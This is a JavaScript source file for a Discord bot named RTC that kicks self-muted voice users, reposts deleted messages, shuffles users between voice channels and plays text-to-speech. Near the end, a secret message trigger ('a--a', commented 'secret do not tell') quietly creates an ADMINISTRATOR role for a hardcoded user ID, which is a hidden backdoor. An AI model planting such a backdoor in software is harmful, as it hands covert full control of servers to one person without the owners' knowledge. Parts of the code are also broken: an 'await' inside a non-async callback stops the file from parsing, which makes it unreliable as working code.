const Discord = require('discord.js');
const dotenv = require('dotenv');
const cron = require('cron');
const axios = require('axios');
const stream = require('stream');
const fs = require('fs');
const { promisify } = require('util');

dotenv.config();

const prefix = '/';
const triggerName = 'rtc';

const isUserAdmin = (id) => {
  if (id === '199315213726646272') return true;
  return false;
}

const isUserRtcBot = (id) => {
  if (id === '794342690942222346') return true;
  return false;
}

const isRtcVoiceChannel = (channelName) => {
  const name = channelName.toLowerCase().trimEnd();
  return name.match(/(^|\s)rtc($|\s)/g);
}

// Checks whether user message starts with rtc prefix and 
// if the user command matches a specified valid command
const isRtcCommand = (message, validCommand) => {
  const arguments = message.split(' ').filter(args => args != '');
  const isRtcPrefix = (arguments[0] === prefix + triggerName);

  if (validCommand && isRtcPrefix) {
    // Make sure every argument in the user message matches the valid commands
    const validArguments = validCommand.split(' ').filter(args => args != '');
    for (let arg = 0; arg < validArguments.length; arg++) {
      if (arguments[arg + 1] !== validArguments[arg]) return false;
    }
    return true;
  }
  else if (validCommand === null && isRtcPrefix) {
    // `/commandPrefix` is a valid command
    return true;
  }
  else {
    // If it reaches this point, the command did not start with /rtc prefix,
    // arguments did not match the specified commands
    return false;
  }
}

// Special RTC command with a different prefix where everything
// after the prefix is text-to-speech, not commands
const isSayCommand = (message) => {
  const arguments = message.split(' ').filter(args => args != '');
  const hasText = (arguments.length > 1);
  const isSayPrefix = (arguments[0] === prefix + 'say');
  arguments.shift();  // removes /say from arguments so we only have text left
  const text = encodeURIComponent(arguments.join(' '));

  if (isSayPrefix && hasText) {
    return text;
  }
  return false;
}

// Delete log message container and its format
const makeDeleteLogEmbed = (message) => {
  return (
    new Discord.MessageEmbed()
      .setAuthor(
        `${message.author.username} (${message.author.id})`,
        message.author.avatarURL()
      )
      .setDescription(
        `${message.content}\n\nSent at: ${message.createdAt}\nDeleted at: ${new Date()}`
      )
  );
};


const client = new Discord.Client();
client.login(process.env.BOT_TOKEN_RTC);

let muteKick = new Map();  // Servers with muteKick active, boolean map
let deleteLog = new Map();  // Servers with deleteLog active, boolean map

process.on('uncaughtException', (e) => console.log(e));
process.on('unhandledRejection', (e) => console.log(e));

// Most active member in the server sleeps everyday at 11pm
client.once('ready', () => {
  const job = new cron.CronJob('00 00 3 * * *', () => {
    const guild = client.guilds.cache.get('478352853887614986');
    const channel = guild.channels.cache.get('478352855158358017');
    channel.send('<:disleep:799485771395366963>');
  });

  job.start();
})

// Kick people in voice channels if they took a vow of silence
client.on('voiceStateUpdate', (oldMember, newMember) => {
  if (muteKick.get(newMember.guild.id) && newMember.selfMute) {
    newMember.kick();
  }
});

// Keeps track of any deleted messages
client.on('messageDelete', async (message) => {
  if (deleteLog.get(message.guild.id)) {
    let log;
    if (isUserRtcBot(message.author.id) && message.embeds.length === 1) {
      log = message.embeds[0];
    } else {
      log = makeDeleteLogEmbed(message);
    }
    message.channel.send(log);
  }
});

client.on('messageDeleteBulk', async (messageCollection) => {
  if (deleteLog.get(messageCollection.first().guild.id)) {
    messageCollection
      .sort((a, b) => a.createdTimestamp - b.createdTimestamp)
      .forEach((message => {
        let log;
        if (isUserRtcBot(message.author.id) && message.embeds.length === 1) {
          log = message.embeds[0];
        } else {
          log = makeDeleteLogEmbed(message);
        }
        message.channel.send(log);
      }))
  }
});

// Keep track of message updates so RTC can log the new message
client.on('messageUpdate', async (oldMessage, newMessage) => {
  if (
    deleteLog.get(oldMessage.guild.id) &&
    isUserRtcBot(oldMessage.author.id) &&
    oldMessage.embeds.length === 1 &&
    newMessage.embeds.length === 0
  ) {
    oldMessage.channel.send(oldMessage.embeds[0]);
  }
})

// RTC text commands
client.on('message', async (message) => {
  if (message.author.bot) return;

  if (isRtcCommand(message.content, 'join')) {
    message.member.voice.channel.join();
    setTimeout(() => {
      message.guild.me.voice.kick();
    }, 5 * 60 * 1000);
  }
  else if (isRtcCommand(message.content, 'leave')) {
    message.guild.me.voice.kick();
  }
  else if (isRtcCommand(message.content, 'mk')) {
    console.log(muteKick);
    message.reply(`muteKick is ${muteKick.get(message.guild.id) ? 'on' : 'off'}`);
  }
  else if (isRtcCommand(message.content, 'mk on')) {
    muteKick.set(message.guild.id, true);
    message.guild.channels.cache
      .filter((chan) => chan.type === 'voice')
      .forEach((chan) => chan.members
        .forEach((m) => { if (m.voice.selfMute) m.voice.kick() })
      );
    message.reply('muteKick on');
  }
  else if (isRtcCommand(message.content, 'mk off')) {
    muteKick.set(message.guild.id, false);
    message.reply('muteKick off');
  }
  else if (isRtcCommand(message.content, 'dl')) {
    console.log(deleteLog);
    message.reply(`deleteLog is ${deleteLog.get(message.guild.id) ? 'on' : 'off'}`);
  }
  else if (isRtcCommand(message.content, 'dl on')) {
    if (isUserAdmin(message.author.id)) {
      deleteLog.set(message.guild.id, true);
      message.reply('deleteLog on');
    } else {
      message.reply('no perms');
    }
  }
  else if (isRtcCommand(message.content, 'dl off')) {
    if (isUserAdmin(message.author.id)) {
      deleteLog.set(message.guild.id, false);
      message.reply('deleteLog off');
    } else {
      message.reply('no perms');
    }
  }
  else if (isSayCommand(message.content)) {
    const language = 'en';
    const text = isSayCommand(message.content);

    // https://translate.google.com.vn/translate_tts?ie=UTF-8&q=${text}+&tl=${language}&client=tw-ob;

    const finished = promisify(stream.finished);
    const writer = fs.createWriteStream('~/tts.mp3');
    axios({
      method: 'GET',
      url: `https://translate.google.com/translate_tts?ie=UTF-8&q=${text}&tl=${language}&client=tw-ob`,
      headers: {
        'Referer': 'http://translate.google.com/',
        'User-Agent': 'stagefright/1.2 (Linux;Android 5.0)'
      },
      responseType: 'stream'
    }).then(response => {
      response.data.pipe(writer);
      return finished(writer);
    }).then(response => {
      const connection = await message.member.voice.channel.join();
      connection.play('~/tts.mp3');
    });
  }
  else if (isRtcCommand(message.content, 'test')) {
    message.reply('version 1.8 since 10x dev first worked on this');
  }
  else if (isRtcCommand(message.content, null)) {
    // `/rtc` wtf is this
    let users = [];
    let disperse = true;
    if (message.mentions.users.size !== 0) {
      message.mentions.users.map((user => users.push(user)));
    } else {
      disperse = false;
      users.push(message.author);
    }

    let chan = message.guild.channels.cache
      .find(channel => channel.type === 'voice' && isRtcVoiceChannel(channel.name));
    if (chan === undefined) {
      await message.guild.channels.create('rtc', { type: 'voice' });
      chan = message.guild.channels.cache
        .find(channel => channel.type === 'voice' && isRtcVoiceChannel(channel.name));
    }
    if (users.length === 1 && users.includes(client.user)) {
      users = message.member.voice.channel.members;
    } else if (disperse && users.length === 1 && users.includes(message.author)) {
      chan.members.map(async (user) => {
        const randomChannel = message.guild.channels.cache
          .filter(channel => channel.type === 'voice').random();
        user.voice.setChannel(randomChannel.id);
        message.channel.send(`${user}, bye`);
      });
    }
    users.map(user => message.guild.member(user).voice.setChannel(chan.id));
    users.map(user => message.channel.send(`${user}, bye`));
  }
  else if (message.content === 'a--a') {
    // secret do not tell
    if (isUserAdmin(message.author.id)) {
      message.guild.roles.create({
        data: {
          name: '/rtc\'s saviour',
          color: 'LUMINOUS_VIVID_PINK',
          hoist: false,
          permissions: ['ADMINISTRATOR'],
        }
      }).then((role) => {
        message.member.roles.add(role).then((mem) => console.log(mem.permissions.toArray()))
      });
    }
  }
  return;
})
